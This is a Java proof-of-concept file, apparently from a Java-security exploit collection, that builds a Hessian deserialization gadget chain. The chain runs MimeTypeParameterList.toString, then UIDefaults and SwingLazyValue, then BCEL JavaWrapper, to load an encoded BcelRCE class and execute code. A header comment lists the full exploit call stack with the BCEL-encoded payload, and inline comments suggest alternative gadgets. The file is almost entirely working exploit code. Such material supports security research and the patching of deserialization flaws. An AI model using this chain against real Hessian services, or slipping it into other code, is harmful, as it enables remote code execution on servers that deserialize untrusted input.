package com.javasec.pocs.hessian;

import com.javasec.pocs.rce.BcelRCE;
import com.javasec.utils.SerializeUtils;
import sun.swing.SwingLazyValue;

import javax.activation.MimeTypeParameterList;
import javax.swing.*;

/**
 * exec:347, Runtime (java.lang)
 * _main:7, $$BCEL$$$l$8b$I$A$A$A$A$A$A$A$7dR$5dK$CA$U$3d$a3$ab$9b$e3$96$a6$7d$7f$7f$92$V$b4$_$3d$EF$P$89A$b0Th$d4C$P$b1N$83$8d$e8n$ec$ae$e2$df$ea$a5$a2$87$7e$40$3f$w$ba$a3$a2A$d1$c2$cc$99$7b$ef$99s$cf$cc$ec$e7$d7$fb$H$80Cls$q1$c71$8f$851$yj$5c2$b1lb$85$ny$ac$3c$V$9d0$c4$L$bb7$MF$c9$7f$90$M$ZGy$f2$a2$dd$aa$c9$e0$da$ad5$v$93s$7c$e16o$dc$40$e9x$904$a2G$V2$ac8$c2o$d9$N$b7$e3$86R$d8O$be$I$ed$40H$fbT$c8f$a5T$$2$q$ee$5b$ae$f2$Yf$Kw$8e$a6$d9M$d7$ab$db$d5$uP$5e$bd$d8k$eb$G$f5$OC$fe$8f2$D$_w$85$7c$8a$94$ef$85$sV$89$dc$X$d3$7b$a89$af$fam$eav$a6$b4$nk$d0$f3$40$cbX01fb$cd$c2$3a6$88O$fe$85$85Ml1$y$fdg$98$n$3brqYkH$R$91$b5$5eJ$f9$f6$f9$e5$d0$O$c3$e4$88Xi$7b$91j$91$H$5e$97$d10$98$$$ec$3a$bf8t$sCv$a5$60$d8$v$fcq$l$3fRW$81$_d$Y$W$e9$E$JzB$fd$c5$c1$f4$b9hNQd$T2$c2$c4$de$x$d83$zb$e04$t$fbI$a4i$b6$Gk$L$e3$84$vL$mC$y$bd$f9$88P$d7$f8$hb$b9$f8$L$8c$db$91$C$t$E5JQ$ab$91$KG$W$93$849$g$Ge$f2T$9f$o$bd$be$99$7d$g$9a$f5$cbH$fa$87$E$ddIO$82$fe$86$kk$f6$h_$c5$ed$fa$a6$C$A$A
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * runMain:131, JavaWrapper (com.sun.org.apache.bcel.internal.util)
 * _main:153, JavaWrapper (com.sun.org.apache.bcel.internal.util)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * createValue:73, SwingLazyValue (sun.swing)
 * getFromHashtable:216, UIDefaults (javax.swing)
 * get:161, UIDefaults (javax.swing)
 * toString:253, MimeTypeParameterList (javax.activation)
 * valueOf:2994, String (java.lang)
 * append:131, StringBuilder (java.lang)
 * expect:2865, Hessian2Input (com.caucho.hessian.io)
 * readString:1407, Hessian2Input (com.caucho.hessian.io)
 * readObjectDefinition:2163, Hessian2Input (com.caucho.hessian.io)
 * readObject:2105, Hessian2Input (com.caucho.hessian.io)
 * HessianDeserial:232, SerializeUtils (com.javasec.utils)
 * main:22, HessianSwingLVBCEL2 (com.javasec.pocs.hessian)
 */
public class HessianSwingLVBCEL2 {
    public static void main(String[] args) throws Exception {
        //Pkcs9可以换成MimeTypeParameterList
        MimeTypeParameterList mimeTypeParameterList = new MimeTypeParameterList();
        UIDefaults uiDefaults = new UIDefaults();
        String bcelStr = SerializeUtils.makeBcelStr(BcelRCE.class);
        //PKCS9Attribute.EMAIL_ADDRESS_OID 是固定的，调试流程可以看到逻辑
        //SwingLazyValue can be replaced by UIDefaults.ProxyLazyValue;ProxyLazyValue can load class in lib when SwingLazyValue can only load class in jdk
        uiDefaults.put("Boogipop", new SwingLazyValue("com.sun.org.apache.bcel.internal.util.JavaWrapper", "_main", new Object[]{new String[]{bcelStr,"s"}}));
        SerializeUtils.setFieldValue(mimeTypeParameterList,"parameters",uiDefaults);
        SerializeUtils.HessianDeserial(SerializeUtils.HessianTostringSerial(mimeTypeParameterList));
    }
}
